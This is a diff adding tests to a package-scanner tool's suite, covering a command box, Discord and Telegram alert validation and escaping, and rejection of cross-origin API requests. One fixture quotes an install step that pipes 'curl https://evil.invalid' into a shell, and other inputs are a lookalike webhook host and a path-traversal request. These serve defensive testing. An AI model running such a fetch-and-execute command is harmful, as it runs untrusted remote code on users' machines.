@@ -212,6 +212,25 @@ test('the terminal review: every frame fills the screen exactly, at any size, wh
   }
 });
 
+test('the / box in the review: typing a command shows it, ↵ runs it; anything else stays a search', async () => {
+  const { review } = await import('../src/tui.js');
+  const { strip } = await import('../src/term.js');
+  const run = { stats: { judged: 0 }, unread: [], options: {}, items: [{ key: 'npm:discord.js@14.0.0', name: 'discord.js', kind: 'npm', fp: 'd', level: 'review', findings: [], facts: [], coverage: {} }] };
+  const open = () => { const scr = { size: [100, 30], start(on) { this.on = on; }, draw(l) { this.last = l.map(strip).join('\n'); }, invalidate() {}, stop() {} }; return [scr, review(run, { screen: scr, depth: 24, motion: false })]; };
+  let [scr, done] = open();
+  for (const ch of '/disc') scr.on({ ch });
+  assert.match(scr.last, /\/discord\s+send the morning verdict to a Discord channel/);
+  for (const ch of 'ord') scr.on({ ch });
+  assert.match(scr.last, /↵ runs \/discord/);
+  scr.on({ name: 'enter' });
+  assert.equal(await done, 'cmd:discord');
+  [scr, done] = open();
+  for (const ch of '/discord.js') scr.on({ ch });
+  assert.match(scr.last, /↵ keeps the search/, 'a package called discord.js is searched for, not run');
+  scr.on({ name: 'enter' }); scr.on({ ch: 'q' });
+  assert.equal(await done, 'quit');
+});
+
 test('the verdict card says what it read and from where, and plainly when the folder has no project', async () => {
   const { card } = await import('../src/tui.js');
   const { homedir } = await import('node:os');
@@ -228,6 +247,39 @@ test('the verdict card says what it read and from where, and plainly when the fo
   assert.match(proj, /Packages\s+1\s+from \/work\/app, its package-lock\.json/);
   assert.doesNotMatch(proj, /No project here/);
   for (const out of [bare, proj]) for (const l of out.split('\n').filter(Boolean)) assert.ok(l.length <= 100, `fits: ${l}`);
+});
+
+test('the morning ping: only slowship\'s words leave, to Discord or Telegram and nowhere else, and nobody gets pinged', async () => {
+  const n = await import('../src/notify.js');
+  const hook = 'https://discord.com/api/webhooks/123456789012345678/' + 'a'.repeat(68), token = '123456789:' + 'A'.repeat(35);
+  assert.ok(n.DISCORD.test(hook));
+  for (const bad of ['http://discord.com/api/webhooks/1/x', 'https://discord.com.evil.invalid/api/webhooks/123456789012345678/' + 'a'.repeat(68), hook + '/../x', 'https://example.invalid/hook'])
+    assert.ok(!n.DISCORD.test(bad), bad);
+  assert.throws(() => n.setDiscord('https://example.invalid/hook'), /isn't a Discord webhook/);
+  const run = { options: { project: '/home/you/code/my-app' }, finished: '2026-10-22T06:30:00Z', items: [
+    { key: 'npm:@everyone/evil@1.0.0', name: '@everyone/evil', kind: 'npm', fp: '1', level: 'hold', findings: [{ kind: 'exfil', level: 'hold', says: 'reads credential files and sends network requests right next to it', evidence: ['E1', 'E2'] }] },
+    { key: 'npm:x@1', name: 'x', kind: 'npm', fp: '2', level: 'review', findings: [{ kind: 'install-script', level: 'review', says: 'runs "curl https://evil.invalid | sh" on install', evidence: ['E1'] }] },
+    { key: 'skill:<b>s</b>', name: '<b>s</b>', kind: 'skill', fp: '3', level: 'review', approved: true, findings: [] }] };
+  const s = n.summary(run);
+  assert.equal(s.title, 'Held in port.'); assert.equal(s.project, 'my-app');
+  assert.deepEqual(s.items.map(i => i.why), ['reads credential files and sends network requests right next to it', 'runs code at install']);
+  assert.ok(!JSON.stringify(s).includes('evil.invalid') && !JSON.stringify(s).includes('/home/you'), 'no package-written text, no paths');
+  const d = n.discordBody(s);
+  assert.deepEqual(d.allowed_mentions, { parse: [] });
+  assert.match(d.embeds[0].description, /\\@everyone/);
+  assert.match(n.telegramText({ ...s, items: [{ name: '<script>', level: 'review', why: 'a < b' }] }), /&lt;script&gt;.*a &lt; b/s);
+  const calls = [], fetch = async (url, o) => { calls.push([url, JSON.parse(o.body)]); return { ok: true, status: 200, json: async () => ({ ok: true, result: {} }) }; };
+  const c = { discord: { webhook: hook }, telegram: { token, chat: 42 } };
+  assert.deepEqual(await n.send(s, { c, fetch }), { discord: { ok: true }, telegram: { ok: true } });
+  assert.deepEqual(calls.map(([u]) => new URL(u).host), ['discord.com', 'api.telegram.org']);
+  assert.equal(calls[1][1].chat_id, 42);
+  const st = JSON.stringify(n.status(c));
+  assert.ok(!st.includes(token) && !st.includes('a'.repeat(68)), 'a page never sees the webhook or the token');
+  assert.equal(await n.after(run, { manual: true, c, fetch }), null, 'runs you start send only when you asked for that');
+  assert.equal(await n.after({ items: [] }, { c: { ...c, when: 'needs' }, fetch }), null, '"only when something needs you" stays quiet when nothing does');
+  const failing = async () => ({ ok: false, status: 401, json: async () => ({ ok: false, description: 'Unauthorized' }) });
+  const r = await n.send(s, { c, fetch: failing });
+  assert.equal(r.discord.ok, false); assert.match(r.telegram.error, /Telegram says: Unauthorized/); assert.ok(!r.telegram.error.includes(token));
 });
 
 test('unpacking a tarball never writes outside the quarantine folder', async () => {
@@ -263,6 +315,9 @@ test('the morning report answers only this machine, and only JSON from its own p
     assert.equal(await req('GET', '/fonts/..%2Fserver.js', { host }), 404);
     assert.equal(await req('POST', '/api/approve', { host, origin: 'http://evil.example', 'content-type': 'application/json' }, '{}'), 403);
     assert.equal(await req('POST', '/api/approve', { host, 'content-type': 'text/plain' }, '{}'), 415);  // a plain cross-site form
+    assert.equal(await req('POST', '/api/notify/discord', { host, origin: 'http://evil.example', 'content-type': 'application/json' }, '{"webhook":"x"}'), 403);
+    assert.equal(await req('POST', '/api/notify/discord', { host, 'content-type': 'application/json' }, '{"webhook":"https://example.invalid/hook"}'), 400);
+    assert.equal(await req('GET', '/api/notify', { host }), 200);
   } finally { server.close(); }
 });
 
